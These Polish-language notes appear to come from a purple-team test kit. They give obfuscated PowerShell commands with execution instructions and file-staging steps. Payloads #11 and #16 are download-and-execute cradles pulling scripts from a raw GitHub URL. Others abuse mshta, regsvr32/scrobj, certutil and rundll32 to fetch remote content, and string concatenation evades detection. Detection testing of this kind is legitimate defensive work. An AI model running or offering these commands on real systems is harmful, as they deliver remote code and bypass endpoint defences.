...
Payloady sieciowe pobierają pliki z:
```
https://raw.githubusercontent.com/piotrekmarcelpiotrekmarcel/test-files/main/files/
```
Wrzuć zawartość folderu `stage/` do folderu `files/` w tym repo na GitHubie.

## WAŻNE — jak poprawnie odpalać te payloady

Te komendy zawierają fragmenty typu `-('en'+'c')` — to **nie jest** literalna
flaga CLI, tylko kod PowerShell (konkatenacja stringów), który musi zostać
**obliczony przez silnik PowerShell** zanim trafi jako argument do procesu.

To działa **tylko** gdy linijka jest wykonywana jako kod PowerShell:
- wklejona bezpośrednio do konsoli PowerShell, LUB
- uruchomiona jako plik `.ps1` (`.\payload.ps1`)

**Nie zadziała**, jeśli:
- odpalasz to z `cmd.exe` (dostaje dosłowny tekst, nie oblicza wyrażenia)
- przekazujesz to jako string do `Start-Process -ArgumentList` (to samo —
  literalny tekst trafia do nowego procesu bez obliczenia przez silnik)

Stąd błąd `'-' was specified with the -Command parameter` — to dokładnie
efekt przekazania dosłownego, nieobliczonego tekstu do nowego `powershell.exe`.

**Gotowe pliki do odpalenia** (po jednym na payload, uruchom z konsoli
PowerShell) znajdziesz w folderze `runners/` — po prostu:
```powershell
.\payload_01_encoded_command.ps1
```
i tak po kolei dla każdego z 20.
...
**Payload #11**
```powershell
powershell.exe -('No'+'P') -C ".('I'+'EX') (New-Object ('Net.'+'Web'+'Client')).('Download'+'String').Invoke('https://raw.githubusercontent.com/piotrekmarcelpiotrekmarcel/test-files/main/files/run.ps1')"
```
...
**Payload #16**
```powershell
powershell -('no'+'p') -c "$w=New-Object ('Net.'+'Web'+'Client');.('I'+'EX') $w.('Download'+'String').Invoke('https://raw.githubusercontent.com/piotrekmarcelpiotrekmarcel/test-files/main/files/c.ps1')"
```
...
**Payload #60**
```powershell
powershell -c "&('Start-'+'Process') mshta.exe -ArgumentList ('https://raw.githubusercontent.com/piotrekmarcelpiotrekmarcel/test-files/main/files/poc.hta')"
```
...
**Payload #63**
```powershell
powershell -c "&('regs'+'vr32') /s /n /u ('/i:'+'https://raw.githubusercontent.com/piotrekmarcelpiotrekmarcel/test-files/main/files/scrobj.dll') ('scr'+'obj.dll')"
```
...
**Payload #64**
```powershell
powershell.exe -c "&('cert'+'util.exe') ('-url'+'cache') ('-sp'+'lit') -f ('https://raw.githubusercontent.com/piotrekmarcelpiotrekmarcel/test-files/main/files/cert.dat') C:\purpletest\stage\cert.dat"
```
...
**Payload #69**
```powershell
powershell.exe -c "&('rund'+'ll32.exe') ('url.'+'dll,FileProtocolHandler') ('https://raw.githubusercontent.com/piotrekmarcelpiotrekmarcel/test-files/main/files/x')"
```
...
Wrzuć zawartość katalogu `stage/` do folderu `files/` w repo
`piotrekmarcelpiotrekmarcel/test-files` na GitHubie, tak żeby poniższe
raw-URL-e się zgadzały:

- `run.ps1` → payload #11 (z GitHuba)
- `c.ps1` → payload #16 (z GitHuba)
- `s.ps1` → payload #27 — **uwaga**: GitHub ma zaufany cert, więc test
  bypassu walidacji certyfikatu będzie "pusty" (nie ma czego omijać). Jeśli
  zależy Ci konkretnie na tej technice, zamiast GitHuba hostuj `s.ps1` na
  własnym serwerze z self-signed certem (np. `10.10.10.50`) i podmień URL
  tylko w `payload_07_tls_bypass_cradle.ps1`.
- `mod.dll` → payload #25 (z GitHuba — musisz go najpierw skompilować,
  patrz README w `stage/`)
- `lib.dll` → payload #42 (musi być fizycznie w `C:\purpletest\stage\` NA
  hoście testowym — ten payload nic nie pobiera z sieci; ściągnij go tam
  ręcznie z GitHuba przed testem: `curl -o lib.dll <raw_url_do_mod.dll>`)
- `helper.cs` → payload #43 (musi być fizycznie w `C:\purpletest\stage\` NA
  hoście testowym — ściągnij ręcznie z GitHuba przed testem)
- `poc.hta` → payload #60 (z GitHuba)
- `scrobj.dll` (w rzeczywistości plik .sct) → payload #63 (z GitHuba)
- `cert.dat` → payload #64 (z GitHuba)
- `x` (dowolna treść) → payload #69 — rundll32/url.dll (z GitHuba)

Payloady #1, #3, #6, #49, #55, #57, #71, #74, #87, #93 nie wymagają żadnych
plików — są samowystarczalne, gotowe pliki-runnery są w `runners/`.
